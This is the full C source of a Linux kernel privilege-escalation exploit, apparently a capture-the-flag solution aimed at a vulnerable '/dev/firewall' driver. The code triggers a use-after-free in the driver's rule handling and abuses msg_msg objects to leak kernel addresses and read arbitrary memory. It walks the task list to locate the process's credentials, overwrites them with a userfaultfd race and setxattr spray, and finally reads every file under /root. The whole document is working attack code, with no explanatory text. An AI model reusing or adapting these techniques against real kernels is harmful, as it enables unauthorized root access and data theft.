//gcc -static -o exploit exploit.c -lpthread

#include <stdio.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <stdint.h>
#include <string.h>
#include <fcntl.h>
#include <assert.h>
#include <stdlib.h>
#include <pthread.h>
#include <sys/msg.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <netinet/if_ether.h>
#include <net/if.h>
#include <unistd.h>
#include <sys/xattr.h>
#include <errno.h>
#include <linux/userfaultfd.h>
#include <sys/syscall.h> 
#include <pthread.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <poll.h>
#include <sys/shm.h>
#include <netinet/in.h>
#include <netinet/tcp.h>

#define ADD_RULE 0x1337babe
#define DELETE_RULE 0xdeadbabe
#define EDIT_RULE 0x1337beef
#define SHOW_RULE 0xdeadbeef
#define DUP_RULE 0xbaad5aad

#define ARPHRD_ETHER 1
#define ARPOP_REQUEST 1 

#define DESC_MAX 0x800

#define INBOUND 0
#define OUTBOUND 1
#define SKIP -1

# define MSG_COPY	040000

typedef struct
{
    char iface[16];
    char name[16];
    char ip[16];
    char netmask[16];
    uint8_t idx;
    uint8_t type;
    uint16_t proto;
    uint16_t port;
    uint8_t action;
    char desc[DESC_MAX];
} user_rule_t;

int fd;
void add_rule(uint8_t idx, 
        char *iface, 
        char *name, 
        char *desc, 
        char* ip,
        char* netmask,
        uint16_t proto,
        uint16_t port,
        uint8_t action,
        uint8_t type) {
    
    user_rule_t rule;
    memset(&rule, 0, sizeof(rule));

    rule.idx = idx;
    memcpy(rule.iface, iface, 16);
    memcpy(rule.name, name, 16);
    strcpy(rule.desc, desc);
    strcpy(rule.ip, ip);
    strcpy(rule.netmask, netmask);
    
    rule.proto = proto;
    rule.port = port;
    rule.action = action;

    rule.type = type;
    
    ioctl(fd, ADD_RULE, &rule);

} 

void edit_rule(uint8_t idx, 
        char *iface, 
        char *name, 
        char *desc, 
        char* ip,
        char* netmask,
        uint16_t proto,
        uint16_t port,
        uint8_t action,
        uint8_t type) {
    
    user_rule_t rule;
    memset(&rule, 0, sizeof(rule));

    rule.idx = idx;
    memcpy(rule.iface, iface, 16);
    memcpy(rule.name, name, 16);
    strcpy(rule.desc, desc);
    strcpy(rule.ip, ip);
    strcpy(rule.netmask, netmask);
    
    rule.proto = proto;
    rule.port = port;
    rule.action = action;

    rule.type = type;
    
    ioctl(fd, EDIT_RULE, &rule);
} 

void dup_rule(uint8_t idx, uint8_t type) {
    
    user_rule_t rule;

    rule.idx = idx;
    rule.type = type;
    ioctl(fd, DUP_RULE, &rule);

}

void free_rule(uint8_t idx, uint8_t type) {
    user_rule_t rule;
    
    rule.idx = idx;
    rule.type = type;
    ioctl(fd, DELETE_RULE, &rule);
}

   
void open_device() {
    fd = open("/dev/firewall", O_RDONLY);
    assert(fd > 0);
}

#define NF_DROP 0
#define NF_ACCEPT 1
#define NF_STOLEN 2
#define NF_QUEUE 3
#define NF_REPEAT 4
#define NF_STOP 5

#define PORT 8080

pthread_t tid;

char* page;

unsigned long cred_target;

void fault_handler(uint64_t* arg){
	static struct uffd_msg uffd_msg;
	long uffd = (long)arg;
	
	for(;;){
		struct pollfd pollfd = {
			.fd = uffd,
			.events = POLLIN
		};

		poll(&pollfd, 1, -1);
		read(uffd, &uffd_msg, sizeof(uffd_msg));
		if(uffd_msg.event & UFFD_EVENT_PAGEFAULT){

			/// Here goes the implementation.
			printf("An event happened\n");
            
            unsigned long buf[3000/8];
            
            for(int i=0; i<0x170; i++){
               buf[i] = cred_target-0x8;
            }

            free_rule(1, OUTBOUND);

            for(int i=0; i<0x10; i++)
                setxattr("/tmp", "x", buf, 3000, XATTR_CREATE);
                        
            struct uffdio_copy uffdio_copy;
            uffdio_copy.src = (unsigned long) page;

           uffdio_copy.dst = (unsigned long) uffd_msg.arg.pagefault.address;
           uffdio_copy.len = 0x2000;
           uffdio_copy.mode = 0;
           uffdio_copy.copy = 0;
           assert(ioctl(uffd, UFFDIO_COPY, &uffdio_copy) != -1);
			return;
		}
		
	}

	return;
}


char * userfaultfd_chunk(){
	
	struct uffdio_api uffdio_api;
	struct uffdio_register uffdio_register;
	int p;

	// Trying to get a userfault fd.
	uint64_t uffd = syscall(__NR_userfaultfd, O_CLOEXEC|O_NONBLOCK);
	assert(uffd > 2);
	
	char* mmaped_ptr = (char *)mmap(NULL,
			0x4000,
			PROT_READ|PROT_WRITE,
			MAP_PRIVATE|MAP_ANONYMOUS,
			-1,
			0
			);
	uffdio_api.api = UFFD_API;
	uffdio_api.features = 0;

	assert(ioctl(uffd, UFFDIO_API, &uffdio_api) != -1);
    
    *(unsigned long*)((char*)(mmaped_ptr+0x2000-0x8)) = 2;

	uffdio_register.range.start = (unsigned long)mmaped_ptr+0x2000;
	uffdio_register.range.len   = 0x2000;
	uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
	assert(ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) != -1);
	
	p = pthread_create(&tid, NULL, (void*)fault_handler, (void *)uffd);
	return mmaped_ptr+0x2000-0x8;
}

void bypass_fg_kaslr()
{
    int shmid; 
    char *shmaddr;

    assert((shmid = shmget(IPC_PRIVATE, 100, 0600)) != -1);
    assert((shmaddr = shmat(shmid, NULL, 0)) != (void*)-1);

    return;
}

char* get_ip(uint32_t ip) {
    unsigned char bytes[4];
    bytes[0] = ip & 0xFF;
    bytes[1] = (ip >> 8) & 0xFF;
    bytes[2] = (ip >> 16) & 0xFF;
    bytes[3] = (ip >> 24) & 0xFF;   
    char* result = malloc(0x20);
    sprintf(result,"%d.%d.%d.%d", bytes[0], bytes[1], bytes[2], bytes[3]);        
    return result;
}

unsigned long *received;

#define PAUSE puts("PAUSED"); getchar();
#define PAGE_SIZE 4096 + 0x100
#define BUFF_SIZE 4096-0x28 + 0x10

unsigned long arb_read(unsigned long addr, int offset) {
    
    addr = addr - 8; 
    unsigned long iface[2] = {0};
    unsigned long name[2] = {1, 0x1100};
    
    uint32_t ip_addr = addr & 0xffffffff;
    uint32_t mask  = addr >> 32;
    
    edit_rule(
            0,
            (char*)iface,
            (char*)name,
           "Nodesc",
            get_ip(ip_addr),
            get_ip(mask),
            0,
            0,
            0,
            OUTBOUND
            );
    
    int ret = msgrcv(0x1, received, (unsigned long)PAGE_SIZE, 0, MSG_NOERROR | MSG_COPY | IPC_NOWAIT);
   
    return received[offset];
}

unsigned long kernel_base;

unsigned long get_cred() {
    int pid = getpid();
    
    unsigned long init_task = kernel_base + 0xc124c0;
    unsigned long pid_offset = 0x398;
    unsigned long next = 0x298;
    unsigned long prev = 0x2a0;
	unsigned long list_head;
    
    printf("process pid %d\n", pid);
    
    list_head = arb_read(init_task + next, 508);
    printf("list head %#lx\n", list_head);
    init_task = list_head - next;
    printf("PID: %d task_struct :%#lx.\n", pid, init_task);

    unsigned long cred = arb_read(init_task + 0x540 - 0x8, 508);
    printf("cred struct is %#lx\n", cred);

    cred_target = cred;
}


int main() {
     /*
    void add_rule(uint8_t idx, 
            char *iface, 
            char *name, 
            char *desc, 
            char* ip,
            char* netmask,
            uint16_t proto,
            uint16_t port,
            uint8_t action,
            uint8_t type) {
    */
    
    open_device();

    struct {
	    long mtype;
    	char mtext[BUFF_SIZE];
    } msg;
    
    memset(msg.mtext, 'M', BUFF_SIZE-1);
    msg.mtext[BUFF_SIZE] = 0;

    add_rule(0,
            "wlan0",
            "MAHER",
            "DESC",
            "192.168.1.8",
            "255.255.255.0",
            IPPROTO_TCP,
            4444,
            NF_DROP, 
            INBOUND);
 
    dup_rule(0, INBOUND);
    free_rule(0, INBOUND);
    

    for(int i=0; i<0x2; i++) {
        msg.mtype = i;
        int msqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
        printf("msqid : %d\n", msqid);
        msgsnd(msqid, &msg, sizeof(msg.mtext), 0);
        printf("%d done!\n", i);
    }
    
    for(int i=0; i<0x100; i++) 
        bypass_fg_kaslr();


    unsigned long iface[2] = {0};
    unsigned long name[2] = {1, 0x1100};

    edit_rule(
            0,
            (char*)iface,
            (char*)name,
           // It will not use this
           "Nodesc" ,
           // wrong ip address to return immediately.
            "2222222222222",
            "1111111111111",
            IPPROTO_TCP,
            4444,
            NF_DROP,
            OUTBOUND
            );

    received = (unsigned long*)malloc(PAGE_SIZE);
    int ret = msgrcv(0x1, received, (unsigned long)PAGE_SIZE, 0, MSG_NOERROR | MSG_COPY | IPC_NOWAIT);
   
    printf("Kernel leak @ %#lx\n", received[511]);
    
    kernel_base = received[511]  - 0xc3d7a0;

    get_cred();

    
    add_rule(1,
        "wlan0",
        "MAHER",
        "DESC",
        "192.168.1.8",
        "255.255.255.0",
        IPPROTO_TCP,
        4444,
        NF_DROP, 
        INBOUND);

    dup_rule(1, INBOUND);
    free_rule(1, INBOUND);

    msg.mtype = 2;
    page = (char *)malloc(0x4000);
    
    *(long*)page = 2;
    
    memset(page+8, 0, 0x4000-8);


    int msqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
    printf("msqid : %d\n", msqid);
    msgsnd(msqid, userfaultfd_chunk(), BUFF_SIZE, 0);
    printf("2 done!\n");
    
    system("/bin/cat /root/*");
    return 0;
}
